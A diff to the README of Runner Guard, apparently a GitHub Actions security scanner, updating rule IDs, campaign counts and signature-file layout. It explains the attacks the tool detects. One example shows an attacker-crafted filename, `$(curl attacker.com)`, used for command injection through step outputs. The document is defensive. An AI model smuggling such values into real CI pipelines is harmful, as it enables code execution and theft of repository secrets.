@@ -55,7 +55,7 @@ Runner Guard uses a four-stage analysis pipeline:
 - **18 detection rules** covering fork checkout exploits, expression injection, secret exfiltration, unpinned actions, AI config injection, and supply chain steganography with permissions-aware severity (read-only jobs get reduced severity for unpinned action findings)
 - **31 threat signatures across 5 campaigns** -- GlassWorm, TeamPCP (Trivy/Checkmarx/LiteLLM), UNC1069/Axios, Telnyx, and general supply chain IOCs organized in `rules/signatures/` by threat actor
 - **Batch scanning** -- scan multiple repos from a file or stdin with `--repos`, parallel scanning with `--concurrency`, output as console summary table, JSON, or CSV
-- **Dependency checking** -- `check-deps` command scans lock files (package-lock.json, requirements.txt, go.sum) against 41 known compromised package versions from 12 confirmed supply chain attack campaigns including UNC1069/Axios, TeamPCP, npm debug/chalk, Solana web3.js, and more
+- **Dependency checking** -- `check-deps` command scans lock files (package-lock.json, requirements.txt, go.sum) against 41 known compromised package versions from 13 confirmed supply chain attack campaigns including UNC1069/Axios, TeamPCP, npm debug/chalk, Solana web3.js, and more
 - **Runner Guard Score** -- CI/CD security score (0-100) with letter grade and category breakdown (Pinning, Permissions, Injection, Triggers, IOCs) displayed after every scan
 - **Interactive CLI menu** -- run `runner-guard` with no arguments for a guided experience with single repo scan, batch scanning, dependency checking, auto-fix, and demo scenarios; power users use flags directly
 - **GlassWorm supply chain attack detection** -- Unicode steganography scanning, known IOC matching, and eval+decode payload pattern detection
@@ -79,7 +79,7 @@ Runner Guard ships with built-in demo scenarios that demonstrate each attack cla
 
 ![Fork Checkout Demo](docs/demo-fork-checkout.gif)
 
-The most common CI/CD pipeline attack: a `pull_request_target` workflow checks out fork code in the privileged base repository context, giving an attacker's build scripts full access to repository secrets. Detects the checkout itself (RGS-001), secret exposure to fork code (RGS-007), unpinned actions vulnerable to tag hijacking (RGS-009), and network exfiltration of secrets (RGS-012).
+The most common CI/CD pipeline attack: a `pull_request_target` workflow checks out fork code in the privileged base repository context, giving an attacker's build scripts full access to repository secrets. Detects the checkout itself (RGS-001), unpinned actions vulnerable to tag hijacking (RGS-007), fork code execution via build tools (RGS-009), and network exfiltration of secrets (RGS-012).
 
 ```bash
 runner-guard demo --scenario fork-checkout
@@ -260,7 +260,7 @@ runner-guard check-deps . --format json
 runner-guard check-deps . --fail-on low
 ```
 
-Scans `package-lock.json` (npm), `requirements.txt` (PyPI), and `go.sum` (Go) against a database of 41 known compromised package versions from 12 confirmed supply chain attack campaigns. Automatically skips `node_modules`, `.git`, `vendor`, and virtual environment directories.
+Scans `package-lock.json` (npm), `requirements.txt` (PyPI), and `go.sum` (Go) against a database of 41 known compromised package versions from 13 confirmed supply chain attack campaigns. Automatically skips `node_modules`, `.git`, `vendor`, and virtual environment directories.
 
 ### Auto-fix workflows
 
@@ -292,8 +292,8 @@ runner-guard demo --scenario microsoft
 runner-guard demo --scenario ai-injection
 runner-guard demo --scenario glassworm
 
-# List available scenarios
-runner-guard demo --list
+# Show help for demo command
+runner-guard demo --help
 ```
 
 ### Baseline management
@@ -338,7 +338,7 @@ runner-guard baseline update
 
 **RGS-019** detects step outputs (`${{ steps.*.outputs.* }}`) interpolated directly in `run:` blocks. Step outputs may carry attacker-controlled data -- for example, a step that runs `git diff --name-only` on a pull request produces filenames that an attacker controls. When those filenames flow through `$GITHUB_OUTPUT` into a step output and are interpolated directly into a shell script, an attacker can craft filenames like `$(curl attacker.com)` to achieve command injection. This rule flags all step output interpolations for manual review, as not all step outputs are dangerous -- the risk depends on what the producing step does.
 
-**RGS-016**, **RGS-017**, and **RGS-018** detect the GlassWorm supply chain attack and related steganographic techniques. RGS-016 performs byte-level scanning of workflow files for invisible Unicode characters (variation selectors, zero-width chars, tag characters) used to encode hidden payloads. RGS-017 extends this analysis to files referenced and executed by workflows (setup.py, package.json, Dockerfiles, shell scripts). RGS-018 matches known IOC patterns from the GlassWorm campaign and detects dangerous eval+decode execution patterns. Threat signatures are loaded from an embedded `signatures.yaml` that can be updated without code changes.
+**RGS-016**, **RGS-017**, and **RGS-018** detect the GlassWorm supply chain attack and related steganographic techniques. RGS-016 performs byte-level scanning of workflow files for invisible Unicode characters (variation selectors, zero-width chars, tag characters) used to encode hidden payloads. RGS-017 extends this analysis to files referenced and executed by workflows (setup.py, package.json, Dockerfiles, shell scripts). RGS-018 matches known IOC patterns from the GlassWorm campaign and detects dangerous eval+decode execution patterns. Threat signatures are loaded from YAML files in the `rules/signatures/` directory, organized by campaign, and can be updated without code changes.
 
 ---
 
@@ -385,7 +385,7 @@ Runner Guard welcomes contributions, especially new detection rules. To add a ru
 4. Add a demo workflow in `demo/vulnerable/workflows/` if the rule covers a distinct attack scenario.
 5. Submit a pull request with a description of the real-world attack pattern the rule detects.
 
-To add threat signatures (IOC patterns for RGS-018) without writing Go code, edit `rules/signatures.yaml` and rebuild. Each signature needs an ID, regex pattern, threat actor name, and severity.
+To add threat signatures (IOC patterns for RGS-018) without writing Go code, add a YAML file to `rules/signatures/` and rebuild. Each signature needs an ID, regex pattern, threat actor name, and severity. See existing files for format.
 
 Please also report false positives. Accuracy is critical for a security tool -- a scanner that cries wolf gets disabled.
 
@@ -393,7 +393,7 @@ Please also report false positives. Accuracy is critical for a security tool -- 
 
 ## About Vigilant
 
-[Vigilant](https://vigilantdefense.com) is a cybersecurity company with 16 years of experience standing between organizations and the threats that want to destroy them. We don't believe in passive defense -- we operate with a warfare mindset, hunting threats before they become breaches.
+[Vigilant](https://vigilantdefense.com) is a cybersecurity company who stands between organizations and the threats that want to destroy them. We don't believe in passive defense -- we operate with a warfare mindset, hunting threats before they become breaches.
 
 We built Runner Guard because we've weaponized these exact attack chains against banks, government agencies, and critical infrastructure in red team engagements. We know what these vulnerabilities look like from both sides of the wire. When autonomous AI agents started exploiting them at scale, we built the scanner we wished existed.
 
